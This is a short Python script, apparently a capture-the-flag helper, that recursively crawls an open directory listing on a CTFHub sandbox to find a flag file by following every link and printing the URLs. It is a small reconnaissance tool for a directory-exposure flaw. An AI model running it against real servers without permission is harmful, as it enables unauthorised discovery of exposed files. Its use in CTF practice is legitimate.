# 用于列出目录遍历漏洞下所有文件
# admin@e-wolf.top
import requests
from bs4 import BeautifulSoup


def get_dir_list(vuln_url): 
    # 获取requests信息
    dir_get = requests.get(url=vuln_url)
    # 处理返回原始信息，方便使用html5解析
    soup_get = BeautifulSoup(dir_get.text, 'html5lib')
    # 初始化目录列表
    dir_list = []
    # 遍历获取第一级目录
    for i in soup_get.find_all('a'):
        href = i['href']
        if i.string == "Parent Directory":
            # 筛去父目录以及以上的href,到了当前目录重置dir_lis
            # t并跳出当前循环
            dir_list = []
            continue
        dir_list.append(href)
    # 递归
    for dir in dir_list:
        print(vuln_url+dir)
        get_dir_list(vuln_url+dir)


# 获取漏洞地址
#vuln_url = input("Vuln URL ==>")
vuln_url = "http://challenge-f2e58ddb22023b4e.sandbox.ctfhub.com:10800/flag_in_here/"
get_dir_list(vuln_url)
